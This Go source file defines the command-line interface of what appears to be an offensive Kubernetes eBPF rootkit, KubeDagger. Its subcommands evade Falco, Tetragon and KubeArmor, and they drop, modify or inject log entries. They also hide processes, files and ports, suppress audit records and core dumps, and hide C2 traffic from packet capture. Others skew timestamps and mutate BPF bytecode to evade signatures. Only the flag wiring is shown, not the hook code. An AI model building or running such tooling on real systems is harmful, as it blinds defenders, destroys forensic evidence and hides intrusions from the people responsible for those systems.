package run

import (
	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/audit_filter"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/coredump"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/evasion"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/log_tamper"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pcap_blind"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/polymorph"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/syscall_bypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/timeskew"
)

var cmdEvasion = &cobra.Command{
	Use:   "evasion",
	Short: "runtime security evasion",
	Long:  "evasion enables techniques to evade Falco, Tetragon, and KubeArmor runtime security tools",
	RunE:  evasionCmd,
}

var cmdLogTamper = &cobra.Command{
	Use:   "log-tamper",
	Short: "Log tampering",
	Long:  "log-tamper hooks vfs_write and journald to drop, modify, or inject log entries",
	RunE:  logTamperCmd,
}

var cmdSyscallBypass = &cobra.Command{
	Use:   "syscall-bypass",
	Short: "Syscall-level hiding",
	Long:  "syscall-bypass hooks getdents64, stat, and proc reads to hide PIDs, files, and ports",
	RunE:  syscallBypassCmd,
}

var cmdAuditFilter = &cobra.Command{
	Use:   "audit-filter",
	Short: "Audit log filtering",
	Long:  "audit-filter hooks audit_log_start/end to suppress or modify audit records for rootkit operations",
	RunE:  auditFilterCmd,
}

var cmdPcapBlind = &cobra.Command{
	Use:   "pcap-blind",
	Short: "Pcap blinding",
	Long:  "pcap-blind attaches socket filters to AF_PACKET to hide C2 traffic from tcpdump/Wireshark",
	RunE:  pcapBlindCmd,
}

var cmdCoredump = &cobra.Command{
	Use:   "coredump-suppress",
	Short: "Core dump suppression",
	Long:  "coredump-suppress hooks do_coredump to prevent memory dumps of rootkit processes",
	RunE:  coredumpCmd,
}

var cmdTimeskew = &cobra.Command{
	Use:   "timeskew",
	Short: "Timestamp manipulation",
	Long:  "timeskew hooks clock functions to skew time responses for targeted processes",
	RunE:  timeskewCmd,
}

var cmdPolymorph = &cobra.Command{
	Use:   "polymorph",
	Short: "BPF polymorphism",
	Long:  "polymorph mutates BPF bytecode (randomize maps, reorder instructions, insert NOPs) to evade signatures",
	RunE:  polymorphCmd,
}

func evasionCmd(cmd *cobra.Command, args []string) error {
	return evasion.Enable(options.Target, options.EvasionMode, options.Output)
}

func logTamperCmd(cmd *cobra.Command, args []string) error {
	return log_tamper.Execute(options.Target, options.LogTamperMode, options.LogTamperPattern, options.LogTamperTarget, options.Output)
}

func syscallBypassCmd(cmd *cobra.Command, args []string) error {
	return syscall_bypass.Execute(options.Target, options.SyscallHidePIDs, options.SyscallHideFiles, options.SyscallHidePorts, options.Output)
}

func auditFilterCmd(cmd *cobra.Command, args []string) error {
	return audit_filter.Execute(options.Target, options.AuditFilterMode, options.AuditFilterPIDs, options.Output)
}

func pcapBlindCmd(cmd *cobra.Command, args []string) error {
	return pcap_blind.Execute(options.Target, options.PcapHidePorts, options.PcapHideIPs, options.Output)
}

func coredumpCmd(cmd *cobra.Command, args []string) error {
	return coredump.Execute(options.Target, options.CoredumpPIDs, options.Output)
}

func timeskewCmd(cmd *cobra.Command, args []string) error {
	return timeskew.Execute(options.Target, options.TimeskewPIDs, options.TimeskewOffset, options.TimeskewMode, options.Output)
}

func polymorphCmd(cmd *cobra.Command, args []string) error {
	return polymorph.Execute(options.Target, options.PolymorphSeed, options.Output)
}

func init() {
	cmdEvasion.PersistentFlags().StringVar(
		&options.EvasionMode,
		"mode",
		"all",
		"evasion mode: falco, tetragon, kubearmor, or all")
	cmdEvasion.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdEvasion)

	cmdLogTamper.PersistentFlags().StringVar(
		&options.LogTamperMode,
		"mode",
		"drop",
		"tamper mode: drop, modify, or inject")
	cmdLogTamper.PersistentFlags().StringVar(
		&options.LogTamperPattern,
		"pattern",
		"",
		"regex pattern to match log entries")
	cmdLogTamper.PersistentFlags().StringVar(
		&options.LogTamperTarget,
		"log-target",
		"syslog",
		"log target: syslog, journald, or container")
	cmdLogTamper.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdLogTamper)

	cmdSyscallBypass.PersistentFlags().StringVar(
		&options.SyscallHidePIDs,
		"hide-pids",
		"",
		"comma-separated PIDs to hide from ps/proc")
	cmdSyscallBypass.PersistentFlags().StringVar(
		&options.SyscallHideFiles,
		"hide-files",
		"",
		"comma-separated file paths to hide from ls/find")
	cmdSyscallBypass.PersistentFlags().StringVar(
		&options.SyscallHidePorts,
		"hide-ports",
		"",
		"comma-separated ports to hide from netstat/ss")
	cmdSyscallBypass.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdSyscallBypass)

	cmdAuditFilter.PersistentFlags().StringVar(
		&options.AuditFilterMode,
		"mode",
		"suppress",
		"filter mode: suppress, modify, or replay")
	cmdAuditFilter.PersistentFlags().StringVar(
		&options.AuditFilterPIDs,
		"pids",
		"",
		"comma-separated PIDs whose audit events to filter")
	cmdAuditFilter.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdAuditFilter)

	cmdPcapBlind.PersistentFlags().StringVar(
		&options.PcapHidePorts,
		"hide-ports",
		"",
		"comma-separated ports to hide from packet capture")
	cmdPcapBlind.PersistentFlags().StringVar(
		&options.PcapHideIPs,
		"hide-ips",
		"",
		"comma-separated IPs to hide from packet capture")
	cmdPcapBlind.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdPcapBlind)

	cmdCoredump.PersistentFlags().StringVar(
		&options.CoredumpPIDs,
		"pids",
		"",
		"comma-separated PIDs to suppress core dumps for")
	cmdCoredump.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdCoredump)

	cmdTimeskew.PersistentFlags().StringVar(
		&options.TimeskewPIDs,
		"pids",
		"",
		"comma-separated PIDs to apply time skew to")
	cmdTimeskew.PersistentFlags().StringVar(
		&options.TimeskewOffset,
		"offset",
		"-3600",
		"time offset in seconds (negative = past)")
	cmdTimeskew.PersistentFlags().StringVar(
		&options.TimeskewMode,
		"mode",
		"shift",
		"skew mode: shift, freeze, or jitter")
	cmdTimeskew.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdTimeskew)

	cmdPolymorph.PersistentFlags().StringVar(
		&options.PolymorphSeed,
		"seed",
		"",
		"mutation seed (empty = random)")
	cmdPolymorph.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdPolymorph)
}
